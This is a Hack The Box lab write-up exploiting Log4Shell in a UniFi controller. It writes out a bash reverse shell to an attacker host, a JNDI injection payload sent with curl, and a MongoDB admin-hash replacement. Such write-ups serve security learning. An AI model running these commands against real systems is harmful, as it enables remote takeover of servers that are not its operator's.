# Unified - HTB Write-Up

## Introduction
Unified is an Easy-rated Linux machine from HTB Starting Point that focuses on exploiting the Log4Shell vulnerability (CVE-2021-44228), one of the most critical vulnerabilities in recent years.

---

## Enumeration
Found key ports with nmap:
- Port 22: SSH
- Port 8080: HTTP
- Port 8443: HTTPS (UniFi Network Controller)
- Port 27117: MongoDB

The UniFi Network Controller on port 8443 was running version 6.4.54, which is vulnerable to Log4Shell.

---

## Vulnerability Discovery
UniFi 6.4.54 is vulnerable to CVE-2021-44228 (Log4Shell), a critical vulnerability in Apache Log4j that allows remote code execution through JNDI injection.

---

## Exploitation

### Setting Up RogueJndi
Used RogueJndi to create the LDAP and HTTP servers needed for Log4Shell exploitation.

Generated base64 payload:
```bash
echo -n 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1' | base64 -w 0
```

Started RogueJndi server:
```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" --hostname "ATTACKER_IP"
```

### Sending the Exploit
Started netcat listener:
```bash
nc -lvnp 443
```

Sent Log4Shell payload to the vulnerable "remember" parameter in the login API:
```bash
curl -i -s -k -X POST 'https://TARGET_IP:8443/api/login' \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin","remember":"${jndi:ldap://ATTACKER_IP:1389/o=tomcat}","strict":true}'
```

Got reverse shell as the `unifi` user.

---

## Privilege Escalation

### MongoDB Enumeration
Found MongoDB running on port 27117 without authentication.

Connected to MongoDB:
```bash
mongo --port 27117 ace
```

Discovered administrator credentials stored in the database.

### Hash Replacement
Generated new password hash:
```bash
mkpasswd -m sha-512 NewPassword
```

Replaced administrator hash in MongoDB:
```bash
db.admin.update({"name":"administrator"},{$set:{"x_shadow":"NEW_HASH"}})
```

Logged into UniFi web interface with new credentials and gained administrator access.

---

## Flags
- User flag: Retrieved from unifi user directory
- Root flag: Retrieved after gaining administrator privileges

---

## Tools Used
- nmap - Port scanning
- RogueJndi - Log4Shell exploitation infrastructure
- netcat - Reverse shell listener
- curl - Sending HTTP requests
- mongo - MongoDB client
- mkpasswd - Password hash generation

---

## What I Learned
- Log4Shell (CVE-2021-44228) exploitation through JNDI injection
- Setting up LDAP/HTTP attack infrastructure
- RogueJndi tool usage
- MongoDB enumeration and manipulation
- Password hash replacement technique
- Reverse shell stabilization

---

## Key Takeaways
Log4Shell is a critical vulnerability that affects millions of systems. This machine demonstrates how a single vulnerability in a logging library can lead to complete system compromise. Defense requires immediate patching, proper input validation, and defense-in-depth strategies.

---

**Disclaimer:** This write-up is for educational purposes only. Always obtain proper authorization before testing security on systems you don't own. Unauthorized access to computer systems is illegal.
